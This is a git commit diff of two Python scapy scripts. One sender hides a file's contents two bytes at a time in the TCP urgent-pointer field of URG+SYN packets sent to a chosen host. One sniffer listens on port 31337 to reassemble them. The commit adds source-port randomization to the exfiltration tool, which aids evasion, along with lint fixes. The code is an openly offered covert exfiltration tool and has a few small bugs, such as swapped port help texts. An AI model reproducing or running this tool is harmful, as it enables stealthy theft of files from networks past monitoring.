fc0fd856133cafbf3e0ab87667bef0cb28f3eb64
Forrest Fleming <ffleming@gmail.com>
2017-10-12 13:54:47 -0700

    lint
    add source port randomization option

--- sniffer.py
+++ sniffer.py
@@ -1,44 +1,48 @@
 import sys
-import logging
-# logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-from scapy.all import *
+from scapy import sniff
+
 
 class UrgExfilSniffer:
     def version():
         return '0.0.1'
 
     def __init__(self, opts):
-        filemode = 'wa' if opts.append else 'wb'
-        self.outfile = open(opts.outfile, "wb")
+        filemode = 'ab' if opts.append else 'wb'
+        self.outfile = open(opts.outfile, filemode)
         self.port = opts.port
         self.verbose = opts.verbose
 
-    def process(packet):
-        print('AAA')
+    def process(self, packet):
+        print(self.bytes_for(packet.urgptr))
 
     def listen(self):
-        fil = "tcp port 31337"# + str(self.port)
-        sniff(filter=fil, prn=UrgExfilSniffer.process)
+        fil = "tcp port 31337"  # + str(self.port)
+        sniff(filter=fil, prn=self.process)
 
     def bytes_for(self, integer):
-        tup = ((integer >> 8), integer & 0x00FF)
-        return byte
-
+        length = 1 if integer < 2**8 else 2
+        return integer.to_bytes(length, 'big')
 
 
 if __name__ == "__main__":
-    import argparse;
+    import argparse
     parser = argparse.ArgumentParser(
                description="Exfiltrate data using TCP urg pointer",
                add_help=True
              )
-    parser.add_argument('-p', '--port', required=True, action='store', help='Destination port', type=int)
-    parser.add_argument('-f', '--outfile', action='store', help='Location to save received data', default="woofer")
-    parser.add_argument('-v', '--verbose', action='store_true', dest='verbose', help='Enable verbose output')
-    parser.add_argument('--truncate', action='store_false', dest='append', help='Truncate outfile', default=True)
-    parser.add_argument('--version', action='version', version=('%(prog)s ' + UrgExfilSniffer.version()), help="Show version information")
+    parser.add_argument('-p', '--port', required=True, action='store',
+                        help='Destination port', type=int)
+    parser.add_argument('-f', '--outfile', action='store',
+                        help='Location to save received data',
+                        default="woofer")
+    parser.add_argument('-v', '--verbose', action='store_true',
+                        dest='verbose', help='Enable verbose output')
+    parser.add_argument('--truncate', action='store_false', dest='append',
+                        help='Truncate outfile', default=True)
+    parser.add_argument('--version', action='version',
+                        version=('%(prog)s ' + UrgExfilSniffer.version()),
+                        help="Show version information")
     opts = parser.parse_args()
     exfil = UrgExfilSniffer(opts)
     exfil.listen()
     sys.exit(0)
-
--- urgflag.py
+++ urgflag.py
@@ -1,8 +1,6 @@
-import logging
 import random
 import sys
 from scapy.all import TCP, IP, send
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 
 class UrgExfil:
@@ -10,30 +8,53 @@ class UrgExfil:
         return '0.0.1'
 
     def __init__(self, opts):
-        self.filename = opts.filename
-        self.host = opts.host
-        self.port = opts.port
-        self.verbose = opts.verbose
+        self._filename = opts.filename
+        self._host = opts.host
+        self._dest_port = opts.dest_port
+        self._source_port = opts.source_port
+        self._verbose = opts.verbose
+        self._randomize_port = opts.randomize_port
+
+    def verbose(self):
+        return self._verbose
+
+    def randomize_port(self):
+        return self._randomize_port
+
+    def host(self):
+        return self._host
+
+    def filename(self):
+        return self._filename
+
+    def source_port(self):
+        if self.randomize_port() or self._source_port is None:
+            return random.randint(1025, 32000)
+        else:
+            return self._source_port
+
+    def dest_port(self):
+        return self._dest_port
 
     def exfiltrate(self):
-        with open(self.filename, "rb") as fh:
+        with open(self.filename(), "rb") as fh:
             bytestream = fh.read(2)
             while bytestream:
                 self.send_data(bytestream)
                 bytestream = fh.read(2)
 
     def send_data(self, bytestream):
-        if self.verbose:
+        if self.verbose():
             print("Exfiltrating " + repr(bytestream.decode('us-ascii')))
         packet = IP()/TCP()
-        packet.dst = self.host
-        packet.dport = self.port
-        packet.sport = random.randint(1025, 32000)
+        packet.dst = self.host()
+        packet.dport = self.dest_port()
+        packet.sport = self.source_port()
         packet.getlayer(TCP).flags = 0x20 | 0x02  # URG & SYN
         packet.urgptr = self.int_for(bytestream)
-        if self.verbose:
+        if self.verbose():
             packet.show()
-        send(packet, verbose=self.verbose)
+        send(packet, verbose=self.verbose())
 
     def int_for(self, bytestream):
         if len(bytestream) == 0:
@@ -50,11 +71,24 @@ if __name__ == "__main__":
                description="Exfiltrate data using TCP urg pointer",
                add_help=True
              )
-    parser.add_argument('filename', metavar='FILE', action='store', help='File to exfiltrate')
-    parser.add_argument('-H', '--host', required=True, action='store', help='Destination host')
-    parser.add_argument('-p', '--port', required=True, action='store', help='Destination port', type=int)
-    parser.add_argument('-v', '--verbose', action='store_true', dest='verbose', help='Enable verbose output')
-    parser.add_argument('--version', action='version', version=('%(prog)s ' + UrgExfil.version()), help="Show version information")
+    parser.add_argument('filename', metavar='FILE', action='store',
+                        help='File to exfiltrate')
+    parser.add_argument('-H', '--host', required=True, action='store',
+                        help='Destination host')
+    parser.add_argument('-p', '--destination-port', required=True,
+                        dest='dest_port', action='store', help='Source port',
+                        type=int)
+    parser.add_argument('--source-port', action='store',
+                        help='Destination port', type=int, dest='source_port',
+                        required=False)
+    parser.add_argument('--randomize-source-port', action='store_true',
+                        help='Randomize source port for each packet',
+                        default=False, dest='randomize_port')
+    parser.add_argument('-v', '--verbose', action='store_true', dest='verbose',
+                        help='Enable verbose output')
+    parser.add_argument('--version', action='version',
+                        version=('%(prog)s ' + UrgExfil.version()),
+                        help="Show version information")
     opts = parser.parse_args()
     exfil = UrgExfil(opts)
     exfil.exfiltrate()
